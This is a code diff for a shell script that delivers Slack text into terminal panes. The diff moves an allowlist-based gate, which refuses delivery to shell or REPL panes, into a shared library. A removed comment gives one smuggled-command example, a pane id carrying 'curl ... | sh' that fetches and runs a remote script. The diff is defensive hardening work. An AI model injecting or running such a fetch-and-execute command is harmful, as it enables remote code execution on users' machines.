@@ -39,85 +39,9 @@ panes=$(herdr pane list 2>/dev/null) || { echo "herdr-deliver: pane list failed"
 
 # A pane id from Slack is untrusted. Delivery is "write literal text, then press
 # Enter" — in an agent that is a prompt, but in a plain SHELL pane it is a
-# command. Nothing downstream distinguishes the two, so a target like
-# "w1:p1 curl https://x/i.sh | sh" would execute. This is the gate for that.
-#
-# We cannot use .agent / .agent_status: agent registration is currently broken
-# (herdr's integration hook needs HERDR_PANE_ID, which agents launched inside a
-# detached tmux session never inherit — see herdr-notify.sh), so .agent is set on
-# 1 of 18 panes, and .agent_status is the non-empty "unknown" on shell panes too.
-# Both would fail open or refuse every real agent.
-#
-# The foreground process is the honest signal: an agent pane runs the agent (or
-# the tmux attach that hosts it); an idle shell pane's foreground IS the shell.
-# Deny shell-only and unreadable panes; anything running a real process is fine.
-# Transparent multiplexers say NOTHING about what is running inside the pane —
-# herdr reports the tmux client alongside the inner process, so 16 of 18 panes
-# here read "tmux,node" and a pane whose agent has exited reads "tmux,zsh".
-# They must be stripped before judging, or "tmux" alone satisfies any
-# "something non-shell is running" test and every shell pane passes.
-_MUX_RE='^(tmux|screen|zellij|abduco|dtach|mosh-client)$'
-
-# ALLOWLIST, not a denylist. A denylist of shells was the wrong shape: vim
-# (`:!cmd`), less (`!cmd`) and any REPL all execute commands just as directly as
-# zsh does, so naming the shells only moved the hole. Name what MAY receive a
-# delivery instead, and everything unrecognised is refused by default.
-#
-# Agents that are their own binary: the name is enough.
-# HERDR_AGENT_PROCS only ever WIDENS this gate — HERDR_AGENT_PROCS='.*' disables
-# it entirely, and the bridge subprocess inherits the daemon's environment, so a
-# value set in herdr-bridge.env or the launchd plist silently applies to messages
-# arriving from Slack. Treat it as security configuration, not convenience.
-# (A malformed regex makes grep error, which denies — that direction is safe.)
-_AGENT_RE="${HERDR_AGENT_PROCS:-^(claude|codex|omc|herdr-reviewr|aider|opencode|goose)$}"
-#
-# Agents that ride a shared runtime need MORE than the name. Every agent here is
-# some form of `node <script>`, but bare `node` with no script is a JS REPL —
-# which evaluates whatever it is handed, i.e. exactly the execution primitive
-# this gate exists to deny. Same for deno/bun/python. So a runtime qualifies
-# only when it is actually RUNNING something: cmdline must carry an argument
-# beyond the binary itself.
-_RUNTIME_RE='^(node|deno|bun|python|python3|python3\.[0-9]+|ruby|perl)$'
-
-pane_is_agent() {
-  local info rows name cmdline
-  info=$(herdr pane process-info --pane "$1" 2>/dev/null) || return 1
-  # name<TAB>cmdline, one process per line. A missing cmdline yields an empty
-  # field, which fails the runtime test below — conservative, as it should be.
-  rows=$(printf '%s' "$info" | jq -r '
-    .result.process_info.foreground_processes[]?
-    | ((.name // "") + "\t" + (.cmdline // ""))' 2>/dev/null)
-  # No foreground process at all = sitting at a shell prompt.
-  [ -n "$rows" ] || return 1
-  while IFS=$'\t' read -r name cmdline; do
-    [ -n "$name" ] || continue
-    printf '%s' "$name" | grep -qxE "$_MUX_RE" && continue   # transparent, tells us nothing
-    printf '%s' "$name" | grep -qxE "$_AGENT_RE" && return 0
-    if printf '%s' "$name" | grep -qxE "$_RUNTIME_RE"; then
-      # "Was it given an ARGUMENT" is not the question — `node -i` has an
-      # argument and is still a REPL. The question is whether it was given
-      # something to RUN. Reject interactive/eval flags outright, then require
-      # the first argument to be a non-flag (a script path).
-      case "$cmdline" in
-        *" -i"*|*" --interactive"*|*" -e "*|*" --eval"*|*" -c "*|*" -p "*|*" --print"*)
-          continue ;;
-      esac
-      case "$cmdline" in
-        *[![:space:]][[:space:]][!-]*) return 0 ;;
-      esac
-    fi
-  done <<EOF
-$rows
-EOF
-  return 1
-}
-
-require_agent_pane() {
-  pane_is_agent "$1" && return 0
-  echo "herdr-deliver: refusing to deliver to '$1' — it is not running an agent." >&2
-  echo "herdr-deliver: text sent to a shell pane executes as a command." >&2
-  return 1
-}
+# command. The gate for that lives in lib/pane-guard.sh, shared with
+# herdr-select.sh so the two input paths cannot drift apart.
+. "$here/lib/pane-guard.sh"
 
 resolve_blocked() {
   local ids
